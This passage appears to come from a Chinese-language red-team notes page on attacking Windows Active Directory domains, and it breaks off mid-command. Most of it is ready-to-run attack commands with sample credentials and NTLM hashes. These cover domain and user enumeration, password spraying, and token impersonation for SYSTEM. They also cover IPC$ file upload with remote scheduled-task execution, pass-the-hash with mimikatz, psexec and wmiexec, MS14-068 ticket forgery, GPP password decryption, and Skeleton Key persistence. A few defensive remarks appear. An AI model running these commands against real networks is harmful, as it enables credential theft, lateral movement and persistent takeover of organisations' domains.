&quot;DC=redteam,DC=com&quot;</span><br><span class="line"></span><br><span class="line">	相对标识名称</span><br><span class="line">		相对标识名称（Relative Distinguished Name，RDN）：RDN⽤来代表DN完整路径中的部分路径，</span><br><span class="line">		例如上⾯路径中的 CN=张三与 OU=Web前端组等都是 RDN。</span><br><span class="line">Base DN：LDAP ⽬录树的最顶部就是根，也就是所谓的 &quot;Base DN&quot;，如 &quot;DC=redteam,DC=com&quot;。</span><br><span class="line">		除了 DN 与 RDN 这两个对象名称外，另外还有如下两个名称：</span><br><span class="line">		全局唯⼀标识符（Global Unique Identifier，GUID）：GUID 是⼀个128位的数值，系统会⾃动为每个对象指定⼀个唯⼀的GUID。虽然可以改变对象的名称，但是其GUID永远不会改变。</span><br><span class="line">		⽤户主体名称（User Principal Name，UPN）</span><br><span class="line">		：每个⽤户还可以有⼀个⽐DN更短、更容易记忆的 UPN，例如上⾯的 metasploit ⾪属于 redteam.com，则其 UPN 可以为 metasploit@redteam.com。⽤户登录时所输⼊的账</span><br><span class="line">户名最好是 UPN，因为⽆论此⽤户的账户被移动到哪⼀个域，其 UPN 都不会改变，因此⽤户可以⼀直使⽤同⼀个名称来登录。</span><br><span class="line">		AD 与 LDAP 的关系：LDAP 是⼀种⽤来访问 AD 数据库的⽬录服务协议，AD DS 会通过 LDAP 名称路径来表示对象在 AD 数据库中的位置，以便⽤它来访问 AD 数据库内的对象。LDAP 的名称路径包括有 DN、RDN。</span><br><span class="line">openLDAP（Linux），Active Directory（Microsoft）等是对 LDAP ⽬录访问协议的具体实现，除了实现协议的功能，还对它进⾏了扩展</span><br><span class="line">通过 kerbrute 批量枚举有效域⽤户账号</span><br><span class="line">	kerbrute 是⼀种通过 Kerberos 预身份验证快速暴⼒破解和枚举有效 Active Directory 帐户的⼯具。</span><br><span class="line">下载地址：https://github.com/ropnop/kerbrute</span><br><span class="line">	kerbrute.exe userenum -d redteam.com users.txt --dc 10.10.10.10</span><br><span class="line"></span><br><span class="line">ADfind</span><br><span class="line">	ADfind 是⼀款 C++编写的⼯具，是⼀款⾮常知名的⼀款域内信息查询⼯具。</span><br><span class="line"></span><br><span class="line">	列出域控制器名称：</span><br><span class="line"></span><br><span class="line">	AdFind -sc dclist</span><br><span class="line">	查看域控版本：</span><br><span class="line">bash</span><br><span class="line">AdFind -schema -s base objectversion</span><br><span class="line">	查询当前域中在线的计算机（所有属性）：</span><br><span class="line">bash</span><br><span class="line">AdFind -sc computers_active</span><br><span class="line">	查询当前域中在线的计算机(只显示名称和操作系统)：</span><br><span class="line">bash</span><br><span class="line">AdFind -sc computers_active name operatingSystem</span><br><span class="line">	查询当前域中所有计算机（所有属性）：</span><br><span class="line">bash</span><br><span class="line">AdFind -f &quot;objectcategory=computer&quot;</span><br><span class="line">	查询指定域（luckysec.cn）中所有计算机（所有属性）：</span><br><span class="line">bash</span><br><span class="line">Adfind.exe -b dc=luckysec,dc=cn -f &quot;objectcategory=computer&quot;</span><br><span class="line">	查询当前域内所有用户：</span><br><span class="line">bash</span><br><span class="line">AdFind -users name</span><br><span class="line">	查询域内所有GPO信息：</span><br><span class="line">bash</span><br><span class="line">AdFind -sc gpodmp</span><br><span class="line">	查看受保护AD域账户:</span><br><span class="line">bash</span><br><span class="line">Adfind -f &quot;&amp;(objectcategory=person)(samaccountname=*)(admincount=1)&quot; -dn</span><br><span class="line">	查看域管账户：</span><br><span class="line"></span><br><span class="line">		AdFind -default -f &quot;(&amp;(|(&amp;(objectCategory=person)(objectClass=user))(objectCategory=group))(adminCount=1))&quot; -dn</span><br><span class="line">		通过 ADfind 获取域内⽤户列表信息</span><br><span class="line"></span><br><span class="line">			adfind.exe -h 10.10.10.10 -u redteam\saulgoodman -up Saul!@#456 -b dc=redteam,dc=com-f &quot;objectcategory=user&quot;</span><br><span class="line"></span><br><span class="line">		通过 ADfind 获取域内⽤户组列表信息</span><br><span class="line">			adfind.exe -h 10.10.10.10 -u redteam\saulgoodman -up Saul!@#456 -b dc=redteam,dc=com-f &quot;objectcategory=group&quot;</span><br><span class="line"></span><br><span class="line">		通过 ADfind 获取指定域内组成员列表信息</span><br><span class="line"></span><br><span class="line">			adfind.exe -h 10.10.10.10 -u redteam\saulgoodman -up Saul!@#456 -b</span><br><span class="line">&quot;CN=metasploit,OU=内⽹安全组,OU=渗透攻击红队,DC=redteam,DC=com&quot; member</span><br><span class="line"></span><br><span class="line">		通过 ADfind 获取域内完整 OU 列表信息</span><br><span class="line">			adfind.exe -h 10.10.10.10 -u redteam\saulgoodman -up Saul!@#456 -default -f</span><br><span class="line">&quot;objectcategory=organizationalUnit&quot; name whenCreated</span><br><span class="line">		通过 ADfind 获取指定 OU 下的⽤户信息</span><br><span class="line"></span><br><span class="line">			adfind.exe -h 10.10.10.10 -u redteam\saulgoodman -up Saul!@#456 &quot;OU=内⽹安全组,DC=redteam,DC=com&quot; -s subtree -f &quot;(objectcategory=user)&quot;</span><br><span class="line"></span><br><span class="line">		通过 ADfind 获取指定 OU 下的⽤户组信息</span><br><span class="line"></span><br><span class="line">			adfind.exe -h 10.10.10.10 -u redteam\saulgoodman -up Saul!@#456 &quot;OU=渗透攻击红</span><br><span class="line">队,DC=redteam,DC=com&quot; -s subtree -f &quot;(objectcategory=group)&quot;</span><br><span class="line">		通过 ADfind 获取指定 OU 下的机器名信息</span><br><span class="line">			adfind.exe -h 10.10.10.10 -u redteam\saulgoodman -up Saul!@#456 &quot;OU=渗透攻击红</span><br><span class="line">队,DC=redteam,DC=com&quot; -s subtree -f &quot;(objectcategory=computer)&quot;</span><br><span class="line">		通过 ADfind 获取完整机器列表信息</span><br><span class="line"></span><br><span class="line">			adfind.exe -h 10.10.10.10 -u redteam\saulgoodman -up Saul!@#456 -b dc=redteam,dc=com</span><br><span class="line">-f &quot;objectcategory=computer</span><br><span class="line">	查看指定域（luckysec.cn）内非约束委派主机：</span><br><span class="line"></span><br><span class="line">		AdFind.exe -b &quot;DC=luckysec,DC=cn&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;  cn</span><br><span class="line">	查询域内⾮约束委派(机器账户)</span><br><span class="line"></span><br><span class="line">		adfind.exe -h 10.10.10.10 -u redteam\saulgoodman -up Saul!@#456 -b &quot;DC=redteam,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)</span><br><span class="line">(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br><span class="line"></span><br><span class="line">	查询域内⾮约束委派(服务账户)</span><br><span class="line"></span><br><span class="line">		adfind.exe -h 10.10.10.10 -u redteam\saulgoodman -up Saul!@#456 -b</span><br><span class="line">&quot;DC=redteam,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)</span><br><span class="line">(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</span><br><span class="line"></span><br><span class="line">	查询域内约束委派（⽤户账户）</span><br><span class="line"></span><br><span class="line">		AdFind.exe -h 10.10.10.10 -u redteam\saulgoodman -up Saul!@#456 -b &quot;DC=redteam,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; msDS-AllowedToDelegateTo</span><br><span class="line"></span><br><span class="line">	查询域内约束委派(机器账户)</span><br><span class="line"></span><br><span class="line">		AdFind.exe   -b &quot;DC=dd,DC=com&quot;  -f &quot;(&amp;(objectCategory=computer)(objectClass=computer) (userAccountControl:1.2.840.113556.1.4.803:=16777216))&quot; msDS-AllowedToDelegateTo</span><br><span class="line"></span><br><span class="line">Csvde</span><br><span class="line">	 是 Windwos server 2008 的内置命令⾏⼯具，位于 %windir%/ system32 ⽂件夹中。如果安装了AD DS或</span><br><span class="line">者Active Directory轻型⽬录服务（AD LDS）服务器⻆⾊，则此功能可⽤。</span><br><span class="line">适⽤于：Windows Server 2003，Windwos Server 2008，Windwos Server 2003 R2，Windwos Server 2008</span><br><span class="line">R2，Windwos Server 2012，带有SP1，Windwos 8的Windos Server 2003.</span><br><span class="line">也就是说我们如果想要利⽤ csvde 去搜集域内信息的话，我们在域外需要安装⼀个 AD（域控制器）。</span><br><span class="line">	通过 csvde 导出域内详细信息通过 csvde 获取域内所有⽤户的详细属性信息（DC, OU, CN, ⽤户, 邮箱,</span><br><span class="line">⼿机号, 所在部⻔, ⽤户描述信息等）1 </span><br><span class="line"></span><br><span class="line">	csvde -setspn redteam -f redteam.all.csv</span><br><span class="line">	通过 csvde 获取域内所有⽤户的详细属性信息（DC, OU, CN, ⽤户, 邮箱,</span><br><span class="line">⼿机号, 所在部⻔, ⽤户描述信息等）</span><br><span class="line">	csvde -s 10.10.10.10 -a redteam\saulgoodman Saul!@#456 -l&quot;cn,objectclass,description,mail,title,department,telephoneNumber,name,homeDirectory,scriptPath,operatingSystem,operatingSystemServicePack,dNSHostName&quot; -r &quot;(&amp;(objectcategory=person)(objectClass=user))&quot; -d &quot;DC=redteam,DC=com&quot; -u -f</span><br><span class="line">redtea.com.user.csv</span><br><span class="line">密码喷洒攻击</span><br><span class="line">	超级密码</span><br><span class="line">	crackmapexec</span><br><span class="line"></span><br><span class="line">		crackmapexec smb 10.10.10.12 -u users.txt -p &apos;admin!@#45&apos; --continue-on-success</span><br><span class="line">		crackmapexec smb 10.10.10.1/24 -u ./users.txt -p  ./345.txt  --continue-on-success</span><br><span class="line">		dd.com\asdsa  格式带上域</span><br><span class="line"></span><br><span class="line">		密码喷射</span><br><span class="line">crackmapexec smb 192.168.3.73-144 -u administrator -p &apos;admin!@#45&apos;</span><br><span class="line">crackmapexec smb 192.168.3.73-144 -u administrator -p &apos;admin!@#45&apos; &apos;Admin12345&apos;</span><br><span class="line">crackmapexec smb 192.168.3.73-144 -u administrator  sqladmin -p &apos;admin!@#45&apos; &apos;Admin12345&apos;</span><br><span class="line">crackmapexec smb 192.168.3.73-144 -u ~/name.txt -p ~/pass.txt</span><br><span class="line">crackmapexec smb 192.168.3.73-144 -u ~/name.txt -H ~/ntlmhash.txt</span><br><span class="line">crackmapexec smb 192.168.3.73-144 -u user -H &apos;NTHASH&apos;</span><br><span class="line">crackmapexec smb 192.168.3.73-144 -u user -H &apos;LMHASH:NTHASH&apos;</span><br><span class="line">		crackmapexec smb 192.168.10.10 -u ./user.txt -p ./password.txt --continue-on-success</span><br><span class="line"></span><br><span class="line">	hydra</span><br><span class="line">		hydra -L users.txt -p admin!@#45 10.10.10.12 smb</span><br><span class="line"></span><br><span class="line">		proxychains hydra -L ./user.txt -p ./passwd.txt 10.10.20.1/24 smb</span><br><span class="line">		 hydra  192.168.10.10 rdp -L user.txt -P password.txt -V</span><br><span class="line"></span><br><span class="line">	kerbrute</span><br><span class="line"></span><br><span class="line">		kerbrute_windows_amd64.exe userenum --dc 192.168.1.109 -d dd.com user.txt</span><br><span class="line"></span><br><span class="line">		./kerbrute_linux_amd64 passwordspray  --dc 192.168.1.109 -d dd.com user.txt  admin.123  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">令牌窃取</span><br><span class="line">	描述进程或者线程安全上下⽂的⼀个对象。不同的⽤户登录计算机后， 都会⽣成⼀个 Access Token ，这个Token 在⽤户创建进程或者线程时会被使⽤，不断的拷⻉，这也就解释了A⽤户创建⼀个进 程⽽该进程没有B⽤户</span><br><span class="line">的权限。⼀般⽤户双击运⾏⼀个进程都会拷⻉ explorer.exe 的 Access Token 。访问</span><br><span class="line"></span><br><span class="line">	令牌分为：授权令牌（Delegation token）：</span><br><span class="line">	交互式会话登陆（例：本地⽤户登陆、⽤户桌⾯等）</span><br><span class="line">	模拟令牌（Impersonation token）：</span><br><span class="line">	⾮交互式登陆（例：net use 访问共享⽂件）</span><br><span class="line">	两种 token 只有在系统重启后才会清除；授权令牌在⽤户注销后，该令牌会变为模拟令牌依旧有效。同样也可以这样理解，当前系统中的某个进程或线程能访问到什么样的系统资源,完全取决于你当前 进程是拿着谁的令牌。</span><br><span class="line">	默认情况下，我们列举令牌，只能列举出当前⽤户和⽐当前⽤户权限更低⽤户的令牌。</span><br><span class="line">	令牌的数量取决 于当前shell的访问级别，如果当前的shell是administrator或者是system，我们就可以看到系统中的所有的令牌。</span><br><span class="line">	我们通过exp提权或者永恒之蓝等得到的权限即为System，假如我们利⽤mimikatz和hashdump不能获得administrator⽤户的密码，那我们只能通过令牌窃取进⾏降权，获得administrator⽤户的shell， 从⽽以administrator⽤户的身份启动某些服务(因为某些服务只能通过administrator⽤户启动)。</span><br><span class="line">	2、针对令牌窃取的防御措施</span><br><span class="line">    及时安装微软推送的补丁不要使用来路不明的软件对令牌的时效性进行限制，越短越好采用加密存储和多重验证保护加密链路防止中间人窃听</span><br><span class="line">	1、令牌窃取</span><br><span class="line">    进入session中输入use incognito 输入list_tokens -u </span><br><span class="line">	load incognito</span><br><span class="line">list_tokens -u</span><br><span class="line">	得到授权令牌：</span><br><span class="line">NT AUTHORITY\LOCAL SERVICE</span><br><span class="line">NT AUTHORITY\NETWORK SERVICE</span><br><span class="line">NT AUTHORITY\SYSTEM</span><br><span class="line">WIN-D2GN1OUFTMB\ailx04</span><br><span class="line">	伪造授权令牌，就可以拥有它的权限了</span><br><span class="line">咱们先拿这个ailx04的令牌，whoami显示的就是ailx04</span><br><span class="line">注意这里的双斜杠</span><br><span class="line">impersonate_token WIN-D2GN1OUFTMB\\ailx04</span><br><span class="line">	impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;</span><br><span class="line">	不过值得注意的是，如果不加双引号，\ 需要改成 \\ 才行，个人猜测可能是因为 \ 被当做转义字符处理的原因。</span><br><span class="line">	烂土豆</span><br><span class="line">		(Rotten Potato) MS16-075 提权是一个本地提权，只针对本地用户，不支持域用户</span><br><span class="line">适用版本：Windows 7、8、10、2008、2012</span><br><span class="line">		https://github.com/foxglovesec/Potato</span><br><span class="line">		meterpreter &gt; getprivs</span><br><span class="line">##或者服务器的cmd下键入以下命令</span><br><span class="line">whoami /all</span><br><span class="line">whoami /priv</span><br><span class="line">		如下，SeImpersonatePrivilege是土豆提权的必要条件</span><br><span class="line"></span><br><span class="line">		use incognito</span><br><span class="line">list_tokens -u</span><br><span class="line">execute -cH -f c:\\wmpub\\potato.exe</span><br><span class="line">		模拟成功后，需要快速使用，否则令牌会消失</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;</span><br><span class="line">IPC的利⽤条件</span><br><span class="line">	简介</span><br><span class="line">		IPC（共享命名管道资源）其实就是为了实现进程间通信⽽开放的命名管道；IPC可以通过验证⽤户名和密码获得相应的权限，通常在远程管理计算机和查看计算机的共享资源使⽤。</span><br><span class="line"></span><br><span class="line">		什么是UNC路径？就是以 \ 开头的路径就是UNC路径，⽐如： \\10.10.10.10\c$\users</span><br><span class="line"></span><br><span class="line">		ipc$可以实现远程登录及对默认共享资源的访问，⽽139端⼝的开启表示NetBIOS协议的应⽤。通过139、445端⼝可以实现对共享⽂件/打印机的访问。⼀般来讲IPC$需要139、445端⼝的⽀持。</span><br><span class="line"></span><br><span class="line">		为什么要命令⾏渗透？</span><br><span class="line"></span><br><span class="line">		1、远程登录桌⾯会增加暴露⻛险</span><br><span class="line">2、⽬标管理员可能对服务器禁⽤远程登录</span><br><span class="line">	利用</span><br><span class="line">	建⽴ IPC：</span><br><span class="line"> net use \\10.10.10.12 /u:redteam\admins admin!@#45</span><br><span class="line"></span><br><span class="line">	如果想要删除 IPC 连接的话就使⽤命令：</span><br><span class="line"></span><br><span class="line">	net use \\10.10.10.12 /de /y</span><br><span class="line"></span><br><span class="line">	net use \\192.168.0.111\ipc$ /del 删除建立的连接</span><br><span class="line">	type \\10.10.10.12\c$\pass.txt</span><br><span class="line">	copy 要上传的⽂件名 \\10.10.10.8\c$\</span><br><span class="line">copy C:\Users\saul\Desktop\1.txt \\10.10.10.8\c$\Users\Administrator\Desktop\</span><br><span class="line">	下载目标 C 盘桌面下的 pass.txt 文件</span><br><span class="line">下载文件我们也可以通过 copy 命令来完成：</span><br><span class="line">copy \\10.10.10.8\c$\Users\Administrator\Desktop\flag.txt</span><br><span class="line">	ipc攻击常用操作：</span><br><span class="line"></span><br><span class="line">		1.连接</span><br><span class="line">net use \靶机ip地址\ipc$ “密码” /user: “用户名”</span><br><span class="line">2.查看连接情况</span><br><span class="line">net use3.查看目标主机共享资源</span><br><span class="line">net view \靶机ip地址</span><br><span class="line">4.查看目标主机时间</span><br><span class="line">net time \靶机ip地址5.查看目标主机的NetBIOS用户（自己本机也需开启）</span><br><span class="line">nbtstat -A 靶机ip地址</span><br><span class="line">6.删除连接</span><br><span class="line">net use \靶机ip地址\ipc$ /del7.文件上传下载</span><br><span class="line">copy e:\nc.exe \靶机ip地址\c$\windows\temp\nq.exe</span><br><span class="line">（将本机e盘上的nc.exe上传到目标的:c\windows\temp\目录下并命名为nq.exe）</span><br><span class="line">copy \靶机ip地址\c$\windows\temp\vmware-vmsvc.log e:\hack（将靶机上的c\windows\temp\vmware-vmsvc.log下载到本地e盘下hack目录）</span><br><span class="line">8.创建计划任务</span><br><span class="line">schtasks /create /tn “任务名” /tr c:\windows\temp\qw.exe /sc once /st 1 6:32 /S 靶机ip地址 /RU System /u administrator /p “密码”9.立即执行计划任务</span><br><span class="line">schtasks /run /tn “任务名” /S 靶机ip地址 /u administrator /p “密码”</span><br><span class="line">10.删除计划任务</span><br><span class="line">schtasks /F /delete /tn “任务名” /S 靶机ip地址 /u administrator /p “密码”</span><br><span class="line">	关闭共享</span><br><span class="line"></span><br><span class="line">		当我们不需要共享时，可以执行以下命令进行关闭：</span><br><span class="line">net  share  ipc$    /delete              #关闭ipc默认共享net  share  c$      /delete              #关闭C盘默认共享</span><br><span class="line">net  share  admin$  /delete              #关闭admin默认共享还有一种就是通过修改注册表的方式，路径是：</span><br><span class="line">\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsaname：restrictanonymous</span><br><span class="line">type: REG_DWORD value:0(默认)</span><br><span class="line">	常用的共享命令</span><br><span class="line">		net use                               #查看本机建立的连接(本机连接其他机器)</span><br><span class="line">net session                           #查看本机建立的连接(其他机器连接的本机)，需要administrator用户执行</span><br><span class="line">net share                             #查看本地开启的共享</span><br><span class="line">net share ipc$                        #开启ipc$共享</span><br><span class="line">net share ipc$ /del                   #删除ipc$共享</span><br><span class="line">net share c$ /del                     #删除C盘共享</span><br><span class="line">net use * /del                        #删除所有连接</span><br><span class="line">net use \\192.168.10.15                   #与192.168.10.15建立ipc空连接(windows10不用)</span><br><span class="line">net use \\192.168.10.15\ipc$              #与192.168.10.15建立ipc空连接(windows10不用)</span><br><span class="line">net use \\192.168.10.15\ipc$ /u:&quot;&quot; &quot;&quot;     #与192.168.10.15建立ipc空连接(windows10不用)</span><br><span class="line">net view \\192.168.10.15                  #查看远程主机开启的默认共享</span><br><span class="line">net use \\192.168.10.15 /u:&quot;administrator&quot; &quot;root&quot;   #以administrator身份与192.168.10.15建立ipc连接</span><br><span class="line">net use \\192.168.10.15 /del              #删除建立的ipc连接</span><br><span class="line">net time \\192.168.10.15                  #查看该主机上的时间</span><br><span class="line">net use \\192.168.10.15\c$ /u:&quot;administrator&quot; &quot;root&quot;  #建立C盘共享</span><br><span class="line">dir \\192.168.10.15\c$                  #查看192.168.10.15C盘文件</span><br><span class="line">dir \\192.168.10.15\c$\user\test.exe    #查看192.168.10.15C盘文件下的user目录下的test.exe文件</span><br><span class="line">net use \\192.168.10.15\c$ /del        #删除该C盘共享连接</span><br><span class="line">net use k: \\192.168.10.15\c$ /u:&quot;administrator&quot; &quot;root&quot;  #将目标C盘映射到本地K盘</span><br><span class="line">net use k: /del     </span><br><span class="line">————————————————</span><br><span class="line"></span><br><span class="line">		当获得一个windows主机的shell后可以执行：</span><br><span class="line">net share 查看目标是否开放ipc$共享;</span><br><span class="line"></span><br><span class="line">net share ipc$ 开放目标的ipc$共享；</span><br><span class="line"></span><br><span class="line">net share ipc$ /del 关闭目标的ipc$共享；</span><br><span class="line"></span><br><span class="line">net share xinxin=c:\ 开共享文件夹，这样就把它的c盘开为共享名为xinxin共享文件夹了。</span><br><span class="line"></span><br><span class="line">	使用tasklist列出远程主机的进程列表：</span><br><span class="line"></span><br><span class="line">		/S : 指定连接到的计算机或IP地址，默认本机</span><br><span class="line">/u [&lt;Domain&gt;\]&lt;UserName&gt; : 指定使⽤哪个⽤户执⾏这个命令</span><br><span class="line">/P [password] : 为指定的⽤户指定密码。</span><br><span class="line">例：tasklist /S 10.10.10.8 /U redteam\administrator /P Admin12345!</span><br><span class="line">	查看远程主机的时间</span><br><span class="line"></span><br><span class="line">		有的时候我们想要在远程主机上执行定时任务，这个时候就需要知道目标主机的时间，这样就⽅便定时任务的执行</span><br><span class="line">net time \\10.10.10.8</span><br><span class="line">Pass The Hash-PTH</span><br><span class="line">	哈希传递</span><br><span class="line"></span><br><span class="line">		（Pass The Hash）攻击，该⽅法通过找到与账户相关的密码 Hash（通常是 NTLM Hash）来进⾏攻击。在域环境中，⽤户登录计算机时使⽤的⼤概都是域账号，⼤量计算机在安装时会使⽤相同的本地管理员账户密码，因此如果计算机的本地管理员账户和密码相同的话，攻击者就能使⽤哈希传递攻击的⽅法登录内⽹中</span><br><span class="line">的其他计算机。</span><br><span class="line"></span><br><span class="line">	条件：</span><br><span class="line"></span><br><span class="line">		有管理员的密码散列值，并且目标机器开放445端口(SMB服务)。</span><br><span class="line">	 mimikatz</span><br><span class="line"></span><br><span class="line">		重点在于使⽤哈希传递的时候需要⽤管理员权限运⾏ mimikatz </span><br><span class="line"></span><br><span class="line">		我们已经获取了域管理员组内⽤户的NTLM哈希</span><br><span class="line">值。我们可以使⽤域内的⼀台主机⽤mimikatz对域内任何⼀台机器(包括域控)进⾏哈希传递攻击。执⾏完命令后，</span><br><span class="line">会弹出CMD窗⼝，在弹出的CMD窗⼝我们可以访问域内任何⼀台机器。前提是我们必须拥有域内任意⼀台主机的</span><br><span class="line">本地管理员权限和域管理员的密码NTLM哈希值。</span><br><span class="line">		sekurlsa::pth /user:域用户名 /domain:域名 /ntlm:域用户名的NTLM值</span><br><span class="line">sekurlsa::pth /user:administrator /domain:god /ntlm:8c535a2d84c3b21059d667639bb89db5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		⾸先假设红队⼈员通过 mimikatz 获取到了域内账号 redteam\admins 的 NTLM hash值： 518b98ad4178a53695dc997aa02d455c</span><br><span class="line"></span><br><span class="line">		mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; &quot;exit&quot;</span><br><span class="line"></span><br><span class="line">		这个时候使⽤ mimikatz 进⾏ PTH：</span><br><span class="line"></span><br><span class="line">		# 运⾏命令弹出CMD</span><br><span class="line"></span><br><span class="line">		mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:admins /domain:redteam.com</span><br><span class="line">		/ntlm:518b98ad4178a53695dc997aa02d455c&quot;</span><br><span class="line">		# 与域控建⽴IPC</span><br><span class="line">net use \\10.10.10.10</span><br><span class="line">		# 查看⽬标机器的C盘⽂件</span><br><span class="line">dir \\10.10.10.10\c$</span><br><span class="line">	使用psexec进行哈希传递攻击：</span><br><span class="line">		psexec.exe -hashes :NTLM值 域名/域用户@域内ip地址</span><br><span class="line">psexec.exe -hashes :8c535a2d84c3b21059d667639bb89db5 god/administrator@192.168.52.138</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		该方式进行哈希传递攻击的优点是不需要建立IPC连接。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	使用wmiexec进行哈希传递攻击：</span><br><span class="line">	缺点是一次只能执行一次命令，而上面三种都是可以执行很多次命令。</span><br><span class="line">wmiexec -hashes :8c535a2d84c3b21059d667639bb89db5 god/administrator@192.168.52.138 &quot;ipconfig&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	进行哈希传递攻击的时候需要注意以下两点：</span><br><span class="line"> </span><br><span class="line">dir命令后面要使用主机名，不能用IP，否则报错</span><br><span class="line">使用mimikatz进行哈希传递要具有本地管理员权限</span><br><span class="line">MS14-068 Attack</span><br><span class="line">	MS14-068 是密钥分发中⼼（KDC）服务中的 Windows 漏洞。它允许经过身份验证的⽤户在其 Kerberos 票证（TGT）中插⼊任意的 PAC（表示所有⽤户权限的结构），该漏洞位于 kdcsvc.dll 域控制器的密钥分发中⼼(KDC)</span><br><span class="line">中，普通⽤户可以通过呈现具有改变了PAC的Kerberos TGT来获得票证，进⽽伪造票据获得管理员权限。</span><br><span class="line">	⾸先需要的条件有：</span><br><span class="line"></span><br><span class="line">	域内任意⽤户 SID、域内任意⽤户密码（经测试只能在 2008及以下的操作系统实现）</span><br><span class="line">假设我们通过内⽹渗透的⼿段获取到了 saulgoodman 域⾥ saulgoodman\saul 的账号密码：</span><br><span class="line">查看⽤户 SID 可以使⽤这条命令：</span><br><span class="line">	ms14-068.exe -u 域成员名@域名 -s 域成员sid -d 域控制器地址 -p 域成员密码</span><br><span class="line">	mimikatz # kerberos::purge         //清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造</span><br><span class="line">mimikatz # kerberos::list          //查看当前机器凭证</span><br><span class="line">mimikatz # kerberos::ptc 票据文件   //将票据注入到内存中</span><br><span class="line">	显示Injecting ticket : OK就表示注入成功了～</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查看注入是否成功并且登录域控：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查看klist:</span><br><span class="line">	发现已经将凭证注入进去了～下面可以使用net use进行登录，或者使用psexec,wmi等方法进行远程执行命令。注意，这里登录时，要使用机器名，不要使用IP，否则没办法攻击成功。</span><br><span class="line"></span><br><span class="line">	user: saulgoodman\saul</span><br><span class="line">pass: admin!@#4</span><br><span class="line"></span><br><span class="line">	ms14-068.exe -u saul@saulgoodman.cn -p admin!@#45 -s S-1-5-21-1252072173-2394922586-</span><br><span class="line">2578876527-1106 -d 10.10.0.8</span><br><span class="line">	成功⽣成名为 TGT_saul@saulgoodman.cn.ccache 的票据⽂件。</span><br><span class="line"></span><br><span class="line">	mimikatz # kerberos::purge //清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造mimikatz # kerberos::list //查看当前机器凭证</span><br><span class="line">mimikatz # kerberos::ptc 票据⽂件 //将票据注⼊到内存中</span><br><span class="line">	kerberos::ptc   TGT_saul@saulgoodman.cn.ccache</span><br><span class="line"></span><br><span class="line">	有的时候直接 dir IP 会显示拒绝访问，我们把 IP 换成域控的主机名就好了，查看域控主机名可以⽤ nbtscan ：</span><br><span class="line">GPP（组策略⾸选项）</span><br><span class="line">	组策略⾸选项简称 GPP，它允许管理员配置和安装以前⽆法使⽤组策略的 Windows 和应⽤程序设置。组策略⾸选</span><br><span class="line">项 (GPP) 最有⽤的功能之⼀是能够存储，此外，这些策略可以对机器进⾏各种配置更改，例如：映射驱动器</span><br><span class="line">创建本地⽤户数据源</span><br><span class="line">打印机配置注册表设置</span><br><span class="line">创建/更新服务计划任务</span><br><span class="line"></span><br><span class="line">	更改本地管理员密码配置 GPP（组策略）环境</span><br><span class="line"></span><br><span class="line">		1、⾸先在命令提示符输⼊：gpmc.msc</span><br><span class="line">		2、选择 saulgoodman.cn --&gt;右键组策略对象--&gt;新建，这⾥新建⼀个 GPPVuln 的组策略对象：</span><br><span class="line"></span><br><span class="line">	漏洞利⽤</span><br><span class="line">		我们知道由于密码存储在 SYSVOL 中的⾸选项⽬中。SYSVOL 是所有经过身份验证的⽤户访问的 Active Directory</span><br><span class="line">中的域扩展共享⽂件夹，也就是说只要你是域⽤户，你就可以访问这个⾸选项共享⽂件夹。</span><br><span class="line">所有域组策略都存储在这⾥： \\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies\</span><br><span class="line">当为⽤户或组帐户创建新的 GPP 时，它将与在 SYSVOL 中创建的 Group.XML ⽂件相关联，其中包含相关的配置</span><br><span class="line">信息，并且</span><br><span class="line"></span><br><span class="line">		密码是 AES-256 位加密的。因此，密码并不安全，且微软已经公布了密钥，我们只要获取到 cpassword 就能获取到明⽂。</span><br><span class="line">		dir \\10.10.0.8\sysvol</span><br><span class="line"></span><br><span class="line">		我们可以直接⼀步步的来到 \\10.10.0.8\sysvol\saulgoodman.cn\Policies\&#123;F776977C-E982-4662-8970-B528C214E5B7&#125;\Machine\Preferences\Groups\ ⽬录下找到 Groups.xml ⽂件：</span><br><span class="line"></span><br><span class="line">		dir \\10.10.0.8\sysvol\saulgoodman.cn</span><br><span class="line">		for /r \\AD-2008/sysvol %i in (*.xml) do @echo %i</span><br><span class="line">		type \\yukong\sysvol\dd.c</span><br><span class="line"></span><br><span class="line">		看信息是否有密码</span><br><span class="line">		newName=&quot;admin&quot;cpassword=&quot;A48HwlVXS/3M2Asazld/d7Fvvt42DD7pOJGn/ut+z7I&quot;</span><br><span class="line"></span><br><span class="line">		去解密 </span><br><span class="line">		gpp-decrypt &quot;A48HwlVXS/3M2Asazld/d7Fvvt42DD7pOJGn/ut+z7I&quot;</span><br><span class="line"></span><br><span class="line">	通过 GPP 在域内进⾏信息搜集凭证</span><br><span class="line"></span><br><span class="line">Skeleton Key</span><br><span class="line">	 Skeleton Key（万能密码），红队⼈员可以对域内权限进⾏持久化操作。因为是使⽤ mimikatz 完成注⼊ Skeleon Key 的操作，将 Skeleton Key 注⼊域控制器的 lsass.exe 进程从⽽实现权</span><br><span class="line">限维持，因此当域控制器重启后肯定就会失效，不过在实战中⼀般域控很少会关机重启，所以还是可以利⽤这种⽅式来暂时性隐蔽⼀段时间</span><br><span class="line"></span><br><span class="line">	因为此时是一个普通的域用户身份，所以系统提示权限不足！</span><br><span class="line">这个时候使用域管理员账号和密码进行连接：</span><br><span class="line">net 